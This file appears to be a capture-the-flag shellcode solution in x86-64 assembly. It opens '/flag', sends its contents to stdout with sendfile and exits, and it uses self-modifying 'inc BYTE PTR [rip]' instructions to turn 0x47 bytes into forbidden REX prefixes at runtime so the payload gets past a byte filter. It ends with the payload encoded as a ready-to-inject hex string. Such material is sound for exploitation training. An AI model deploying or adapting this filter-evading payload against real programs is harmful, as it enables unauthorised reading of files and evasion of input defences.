# Shellcode by x90slide

# The .text section in the program should be writeable

.global _start
_start:
.intel_syntax noprefix
    mov ebx, 0x67616c66 # Little Endian File Location
    inc BYTE PTR [rip]
    .byte 0x47
    shl ebx, 8
    mov bl, 0x2f
    push rbx
    inc BYTE PTR [rip]
    .byte 0x47
    .byte 0x31
    .byte 0xc0
    mov al, 2
    inc BYTE PTR [rip]
    .byte 0x47
    .byte 0x89
    .byte 0xe7
    inc BYTE PTR [rip]
    .byte 0x47
    .byte 0x31
    .byte 0xf6
    syscall

    xor r10, r10
    mov r10b, 1
    shl r10, 12
    inc BYTE PTR [rip]
    .byte 0x47
    .byte 0x31
    .byte 0xd2
    inc BYTE PTR [rip]
    .byte 0x47
    .byte 0x89
    .byte 0xc6
    inc BYTE PTR [rip]
    .byte 0x47
    .byte 0x31
    .byte 0xff
    mov dil, 1
    inc BYTE PTR [rip]
    .byte 0x47
    .byte 0x31
    .byte 0xc0
    mov al, 40
    syscall

    inc BYTE PTR [rip]
    .byte 0x47
    .byte 0x31
    .byte 0xc0
    mov al, 60
    syscall

"\xBB\x66\x6C\x61\x67\xFE\x05\x00\x00\x00\x00\x47\xC1\xE3\x08\xB3\x2F\x53\xFE\x05\x00\x00\x00\x00\x47\x31\xC0\xB0\x02\xFE\x05\x00\x00\x00\x00\x47\x89\xE7\xFE\x05\x00\x00\x00\x00\x47\x31\xF6\x0F\x05\x4D\x31\xD2\x41\xB2\x01\x49\xC1\xE2\x0C\xFE\x05\x00\x00\x00\x00\x47\x31\xD2\xFE\x05\x00\x00\x00\x00\x47\x89\xC6\xFE\x05\x00\x00\x00\x00\x47\x31\xFF\x40\xB7\x01\xFE\x05\x00\x00\x00\x00\x47\x31\xC0\xB0\x28\x0F\x05\xFE\x05\x00\x00\x00\x00\x47\x31\xC0\xB0\x3C\x0F\x05"
